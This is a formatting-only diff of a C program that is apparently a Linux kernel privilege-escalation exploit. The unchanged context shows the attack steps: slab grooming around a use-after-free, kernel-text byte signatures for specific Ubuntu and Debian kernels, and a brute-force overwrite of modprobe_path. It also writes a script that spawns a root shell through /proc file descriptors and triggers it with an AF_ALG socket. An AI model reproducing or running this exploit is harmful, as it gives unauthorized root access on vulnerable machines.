@@ -105,6 +105,7 @@ int act(int act_fd, int code, int n, char *args)
 #define OBJS_PER_SLAB 42
 #define CPU_PARTIAL 120
 
+/* clang-format off */
 #define PTE_INDEX_TO_VIRT(i) ((unsigned long)i << 12)
 #define PMD_INDEX_TO_VIRT(i) ((unsigned long)i << 21)
 #define PUD_INDEX_TO_VIRT(i) ((unsigned long)i << 30)
@@ -115,6 +116,7 @@ int act(int act_fd, int code, int n, char *args)
 			 PMD_INDEX_TO_VIRT(pmd_index) + \
 			 PTE_INDEX_TO_VIRT(pte_index) + \
 			 (unsigned long)page_index)
+/* clang-format on */
 
 #define PT_ENTRIES (PAGE_SIZE / 8)
 
@@ -168,8 +170,7 @@ int prepare_page_tables(void)
 		}
 	}
 	printf("[+] mmap 4 KiB for each PUD entry: from %p to %p\n",
-			PT_INDICES_TO_VIRT(PGD_N, 0, 0, 0, 0),
-			PT_INDICES_TO_VIRT(PGD_N, i, 0, 0, 0));
+	       PT_INDICES_TO_VIRT(PGD_N, 0, 0, 0, 0), PT_INDICES_TO_VIRT(PGD_N, i, 0, 0, 0));
 
 	return EXIT_SUCCESS;
 }
@@ -295,12 +296,14 @@ int get_modprobe_path(char *buf, size_t buf_size)
  *  2. Ubuntu 6.12.28, 6.10.11, 6.6.89,
  *  3. Debian 6.12.25, 6.11.6, 6.1.10.
  */
+/* clang-format off */
 #define KERNEL_TEXT_PATTERNS                                                  \
 	{ "\x49\x89\xf7\x48\x8d\x25\x4e\x3f\xa0\x01\xb9\x01\x01\x00\xc0\x48", \
 	  "\x49\x89\xf7\x48\x8d\x25\x4e\x3f\xa0\x01\x48\x8d\x3d\xef\xff\xff", \
 	  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90", \
 	  "\xfc\x0f\x01\x15\xa0\xdc\x77\x03\xb8\x10\x00\x00\x00\x8e\xd8\x8e", \
 	  "\x48\x8d\x25\x51\x3f\xa0\x01\x48\x8d\x3d\xf2\xff\xff\xff\xb9\x01" }
+/* clang-format on */
 
 #define KERNEL_TEXT_PATTERN_LEN 16
 
@@ -367,7 +370,8 @@ void *memmem_modprobe_path_bruteforce(void *memory, size_t memory_size)
 	}
 
 	modprobe_path_len = strlen(modprobe_path);
-	modprobe_path_uaddr = memmem(kernel_text, end - kernel_text, modprobe_path, modprobe_path_len);
+	modprobe_path_uaddr =
+		memmem(kernel_text, end - kernel_text, modprobe_path, modprobe_path_len);
 	if (modprobe_path_uaddr == NULL) {
 		printf("[!] modprobe_path is not found in this memory region\n");
 		return NULL;
@@ -387,7 +391,8 @@ void *memmem_modprobe_path_bruteforce(void *memory, size_t memory_size)
 	if (modprobe_path[0] != 'x') {
 		printf("[!] modprobe_path overwriting failed, start a new search\n");
 		/* Recursion */
-		return memmem_modprobe_path_bruteforce(modprobe_path_uaddr, end - modprobe_path_uaddr);
+		return memmem_modprobe_path_bruteforce(modprobe_path_uaddr,
+						       end - modprobe_path_uaddr);
 	}
 
 	printf("[+] testing modprobe_path overwriting succeeded\n");
@@ -421,10 +426,8 @@ int prepare_privesc_script(char *path, size_t path_size)
 		return EXIT_FAILURE;
 	}
 
-	ret = dprintf(script_fd,
-		      "#!/bin/sh\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n",
-		      pid, shell_stdin_fd,
-		      pid, shell_stdout_fd);
+	ret = dprintf(script_fd, "#!/bin/sh\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n", pid,
+		      shell_stdin_fd, pid, shell_stdout_fd);
 	if (ret < 0) {
 		perror("[-] dprintf for privesc_script");
 		return EXIT_FAILURE;
@@ -453,10 +456,7 @@ int prepare_privesc_script(char *path, size_t path_size)
 /* See https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch */
 void trigger_modprobe_sock(void)
 {
-	struct sockaddr_alg sa = {
-		.salg_family = AF_ALG,
-		.salg_type = "dummy"
-	};
+	struct sockaddr_alg sa = { .salg_family = AF_ALG, .salg_type = "dummy" };
 	int alg_fd = -1;
 
 	printf("[!] gonna trigger modprobe using AF_ALG socket and launch the root shell\n");
@@ -544,7 +544,7 @@ int main(void)
 	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
 
 	printf("[!] obtain dangling reference from use-after-free bug\n");
- 	uaf_n = current_n - 1;
+	uaf_n = current_n - 1;
 	printf("[+] done, uaf_n: %ld\n", uaf_n);
 
 	printf("[!] create new active slab, allocate objs_per_slab objects\n");
